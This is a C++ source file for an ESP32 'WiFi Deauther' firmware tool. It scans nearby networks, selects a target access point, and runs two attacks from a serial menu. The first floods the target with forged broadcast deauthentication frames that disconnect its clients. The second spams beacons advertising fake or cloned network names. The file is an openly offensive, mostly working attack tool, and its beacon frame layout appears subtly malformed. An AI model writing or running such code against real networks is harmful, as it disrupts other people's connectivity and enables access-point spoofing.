#include "WiFiAttacker/WiFiAttacker.h"

WiFiAttacker::WiFiAttacker() 
    : attackRunning(false)
    , attackType(0)
    , currentChannel(1) {
    initializePacketTemplates();
}

void WiFiAttacker::initializePacketTemplates() {
    // Initialize deauth packet template
    uint8_t deauthTemplate[26] = {
        0xC0, 0x00,                         // Type/Subtype: Deauthentication
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (AP)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP MAC)
        0x00, 0x00,                         // Sequence/Fragment number
        0x07, 0x00                          // Reason code (Class 3 frame received)
    };
    memcpy(deauthPacket, deauthTemplate, sizeof(deauthTemplate));

    // Initialize beacon packet template
    uint8_t beaconTemplate[109] = {
        0x80, 0x00, 0x00, 0x00,             // Type/Subtype
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
        0x64, 0x00,                         // Beacon interval
        0x31, 0x04,                         // Capability info
        0x00, 0x00                          // SSID parameter set (filled dynamically)
    };
    memcpy(beaconPacket, beaconTemplate, sizeof(beaconTemplate));
}

void WiFiAttacker::setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n==============================");
    Serial.println("   ESP32 WiFi Deauther v1.0   ");
    Serial.println("==============================\n");
    
    // Set WiFi to station mode and disconnect
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // Enable promiscuous mode for packet injection
    esp_wifi_set_promiscuous(true);
    
    printMenu();
}

void WiFiAttacker::loop() {
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        handleCommand(cmd);
    }
    
    if (attackRunning) {
        if (attackType == 1) {
            sendDeauthPacket();
            delay(100);
        } else if (attackType == 2) {
            sendBeaconSpam();
            delay(100);
        }
    }
}

void WiFiAttacker::printMenu() {
    Serial.println("\n--- MENU ---");
    Serial.println("1. Scan WiFi Networks");
    Serial.println("2. Select Target (input: 2 <network_number>)");
    Serial.println("3. Start Deauth Attack");
    Serial.println("4. Start Beacon Spam");
    Serial.println("5. Stop Attack");
    Serial.println("6. Change Channel (input: 6 <channel>)");
    Serial.println("7. Show Menu");
    Serial.println("\nCurrent Channel: " + String(currentChannel));
    Serial.println("Target: " + (targetSSID.length() > 0 ? targetSSID : "None"));
    Serial.println();
}

void WiFiAttacker::handleCommand(String cmd) {
    if (cmd == "1") {
        scanNetworks();
    } else if (cmd.startsWith("2 ")) {
        int networkIndex = cmd.substring(2).toInt();
        selectTarget(networkIndex);
    } else if (cmd == "3") {
        startDeauthAttack();
    } else if (cmd == "4") {
        startBeaconSpam();
    } else if (cmd == "5") {
        stopAttack();
    } else if (cmd.startsWith("6 ")) {
        int channel = cmd.substring(2).toInt();
        changeChannel(channel);
    } else if (cmd == "7") {
        printMenu();
    } else {
        Serial.println("Unknown command. Type '7' for menu.");
    }
}

const char* WiFiAttacker::getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA+WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
        default: return "Unknown";
    }
}

void WiFiAttacker::scanNetworks() {
    Serial.println("\n[*] Scanning WiFi networks...");
    attackRunning = false;
    esp_wifi_set_promiscuous(false);
    
    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        Serial.println("[-] No networks found");
    } else {
        Serial.println("\n[+] Found " + String(n) + " networks:\n");
        Serial.println("ID | SSID                  | RSSI | Ch | Encryption");
        Serial.println("---+----------------------+------+----+-----------");
        
        for (int i = 0; i < n; i++) {
            Serial.printf("%2d | %-20s | %4d | %2d | %s\n",
                i,
                WiFi.SSID(i).c_str(),
                WiFi.RSSI(i),
                WiFi.channel(i),
                getEncryptionType(WiFi.encryptionType(i))
            );
        }
    }
    
    esp_wifi_set_promiscuous(true);
    Serial.println();
}

void WiFiAttacker::selectTarget(int index) {
    esp_wifi_set_promiscuous(false);
    int n = WiFi.scanNetworks();
    
    if (index < 0 || index >= n) {
        Serial.println("[-] Invalid network index");
        esp_wifi_set_promiscuous(true);
        return;
    }
    
    targetSSID = WiFi.SSID(index);
    memcpy(targetBSSID, WiFi.BSSID(index), 6);
    currentChannel = WiFi.channel(index);
    
    Serial.println("\n[+] Target selected:");
    Serial.println("    SSID: " + targetSSID);
    Serial.printf("    BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
        targetBSSID[0], targetBSSID[1], targetBSSID[2],
        targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.println("    Channel: " + String(currentChannel));
    
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
}

void WiFiAttacker::startDeauthAttack() {
    if (targetSSID.length() == 0) {
        Serial.println("[-] No target selected. Use command '2 <index>' first.");
        return;
    }
    
    Serial.println("\n[!] Starting Deauth Attack on: " + targetSSID);
    Serial.println("[!] Press '5' to stop\n");
    
    // Set target BSSID in deauth packet
    memcpy(&deauthPacket[10], targetBSSID, 6); // Source MAC (AP)
    memcpy(&deauthPacket[16], targetBSSID, 6); // BSSID
    
    attackType = 1;
    attackRunning = true;
}

void WiFiAttacker::sendDeauthPacket() {
    // Broadcast to all clients
    memset(&deauthPacket[4], 0xFF, 6); // Destination: broadcast
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    
    Serial.print(".");
}

void WiFiAttacker::startBeaconSpam() {
    Serial.println("\n[!] Starting Beacon Spam Attack");
    Serial.println("[!] This will create fake WiFi networks");
    Serial.println("[!] Press '5' to stop\n");
    
    attackType = 2;
    attackRunning = true;
}

void WiFiAttacker::sendBeaconSpam() {
    // Use target SSID if selected, otherwise generate random SSID
    String fakeSSID;
    if (targetSSID.length() > 0) {
        fakeSSID = targetSSID;
    } else {
        fakeSSID = "FakeAP-" + String(random(1000, 9999));
    }
    
    // Random MAC
    for (int i = 10; i < 16; i++) {
        beaconPacket[i] = random(256);
    }
    
    // Build beacon packet with SSID
    uint8_t packet[MAX_PACKET_SIZE];
    memcpy(packet, beaconPacket, 37);
    
    // SSID length must not exceed 32 bytes for 802.11
    int ssidLen = min((int)fakeSSID.length(), MAX_SSID_LENGTH);
    packet[37] = ssidLen; // SSID length
    memcpy(&packet[38], fakeSSID.c_str(), ssidLen);
    
    int packetSize = 38 + ssidLen;
    
    esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false);
    
    Serial.print("*");
}

void WiFiAttacker::stopAttack() {
    attackRunning = false;
    attackType = 0;
    Serial.println("\n\n[!] Attack stopped");
    printMenu();
}

void WiFiAttacker::changeChannel(int channel) {
    if (channel < 1 || channel > 13) {
        Serial.println("[-] Invalid channel (1-13)");
        return;
    }
    
    currentChannel = channel;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    Serial.println("[+] Channel changed to: " + String(currentChannel));
}